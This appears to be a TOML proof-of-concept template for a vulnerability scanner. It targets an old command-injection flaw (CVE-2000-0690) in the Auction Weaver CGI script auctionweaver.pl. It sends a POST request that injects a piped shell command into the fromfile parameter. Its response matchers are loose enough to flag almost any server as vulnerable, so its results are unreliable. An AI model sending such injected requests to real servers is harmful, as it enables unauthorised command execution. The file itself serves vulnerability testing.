[info]
author = "ave"
description = "通过向 Auction Weaver CGI 脚本 auctionweaver.pl 的 fromfile 参数注入 shell 元字符，验证远程命令执行漏洞。发送包含管道符的 POST 请求，检测脚本是否响应。"
id = "POC-AVE-2000-0541"
name = "CGI Script Center Auction Weaver 远程命令执行 PoC"
severity = "critical"
tags = ["ave-2000-0541"]
vuln_id = [
    "CVE-2000-0690",
    "AVE-2000-0541",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/awl/auctionweaver.pl"
protocol = "http"

[poc.requests.body]
content = "flag1=1&fromfile=%7Cecho+AVE_TEST%7C&placebid=1&catdir=cat1&username=test&password=test&bid=1&nobiditem=1&sbutton=BID"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "302",
    "500",
    "document",
]
